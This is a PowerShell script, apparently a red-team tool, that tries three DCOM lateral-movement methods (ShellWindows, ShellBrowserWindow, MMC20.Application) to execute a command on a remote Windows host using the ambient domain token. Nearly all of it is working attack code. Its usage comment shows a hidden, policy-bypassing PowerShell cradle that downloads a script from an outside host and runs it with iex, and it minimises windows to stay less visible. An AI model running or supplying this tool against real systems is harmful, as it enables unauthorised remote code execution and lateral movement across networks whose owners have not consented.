# TestDCOM.ps1 — probe DCOM lateral movement methods against a target
# Tries ShellWindows, ShellBrowserWindow, MMC20 in order.
# Proof-of-execution payload: calc.exe (visible on desktop if session is active).
# Run from a runas /netonly session — uses the ambient domain token.
#
# Usage:
#   .\TestDCOM.ps1 [-Target 10.3.10.22] [-Command calc.exe]
#
# To test real payload delivery, set -Command to your cradle after running serve:
#   .\TestDCOM.ps1 -Target 10.3.10.22 `
#       -Command "powershell.exe" `
#       -Args "-nop -ep bypass -w hidden -c `"iex(new-object net.webclient).downloadstring('http://10.3.10.157:8080/pipe_XXXX.ps1')`""

param(
    [string]$Target  = "10.3.10.22",
    [string]$Command = "calc.exe",
    [string]$Args    = ""
)

$ErrorActionPreference = "SilentlyContinue"

function Test-DCOMMethod {
    param([string]$Name, [scriptblock]$Block)
    Write-Host "`n[*] Trying $Name on $Target ..." -ForegroundColor Cyan
    try {
        $result = & $Block
        Write-Host "[+] $Name — SUCCESS" -ForegroundColor Green
        return $true
    } catch {
        $msg = $_.Exception.Message -replace '\s+',' '
        if ($msg.Length -gt 120) { $msg = $msg.Substring(0,120) + '...' }
        Write-Host "[-] $Name — FAILED: $msg" -ForegroundColor Red
        return $false
    }
}

Write-Host "=== DCOM delivery test ===" -ForegroundColor Yellow
Write-Host "Target  : $Target"
Write-Host "Command : $Command"
if ($Args) { Write-Host "Args    : $Args" }
Write-Host ""

# ── 1. ShellWindows ───────────────────────────────────────────────────────────
# Attaches to existing explorer.exe via DCOM Access permission.
# No local admin needed; requires active interactive session on target.
$sw_ok = Test-DCOMMethod "ShellWindows (9BA05972)" {
    $comType = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C91F3880", $Target)
    $comObj  = [System.Activator]::CreateInstance($comType)
    $item    = $comObj.Item()
    if (-not $item) { throw "Item() returned null — no explorer windows (session locked or no desktop)" }
    Write-Host "    [*] Got ShellWindows item: $($item.LocationName)" -ForegroundColor DarkGray
    $item.Document.Application.ShellExecute($Command, $Args, "c:\windows\system32", $null, 0)
}

# ── 2. ShellBrowserWindow ─────────────────────────────────────────────────────
# Same privilege model as ShellWindows; try if ShellWindows item was null.
$sbw_ok = Test-DCOMMethod "ShellBrowserWindow (C08AFD90)" {
    $comType = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", $Target)
    $comObj  = [System.Activator]::CreateInstance($comType)
    # ShellBrowserWindow gives a direct Document.Application without .Item()
    $comObj.Document.Application.ShellExecute($Command, $Args, "c:\windows\system32", $null, 0)
}

# ── 3. MMC20.Application ─────────────────────────────────────────────────────
# Launches mmc.exe — requires DCOM Launch permission (local admin by default).
$mmc_ok = Test-DCOMMethod "MMC20.Application" {
    $comType = [Type]::GetTypeFromProgID("MMC20.Application", $Target)
    $comObj  = [System.Activator]::CreateInstance($comType)
    # ExecuteShellCommand(Command, Directory, Parameters, WindowState)
    # "7" = SW_SHOWMINNOACTIVE (minimised, not focused — less visible)
    $comObj.Document.ActiveView.ExecuteShellCommand($Command, $null, $Args, "7")
}

# ── Summary ───────────────────────────────────────────────────────────────────
Write-Host "`n=== Results ===" -ForegroundColor Yellow
@(
    @{ Name="ShellWindows       (no admin, needs session)"; OK=$sw_ok  }
    @{ Name="ShellBrowserWindow (no admin, needs session)"; OK=$sbw_ok }
    @{ Name="MMC20              (requires local admin)    "; OK=$mmc_ok }
) | ForEach-Object {
    $icon  = if ($_.OK) { "[+]" } else { "[-]" }
    $color = if ($_.OK) { "Green" } else { "DarkGray" }
    Write-Host "  $icon $($_.Name)" -ForegroundColor $color
}

if (-not ($sw_ok -or $sbw_ok -or $mmc_ok)) {
    Write-Host "`n[!] All methods failed. Common causes:" -ForegroundColor Yellow
    Write-Host "    - No active interactive session on target (session locked / no logon)" -ForegroundColor DarkGray
    Write-Host "    - DCOM blocked by host firewall (TCP 135 + dynamic RPC ports)" -ForegroundColor DarkGray
    Write-Host "    - DCOM permissions tightened via GPO" -ForegroundColor DarkGray
    Write-Host "    - Credentials not reaching target (run from runas /netonly session)" -ForegroundColor DarkGray
}
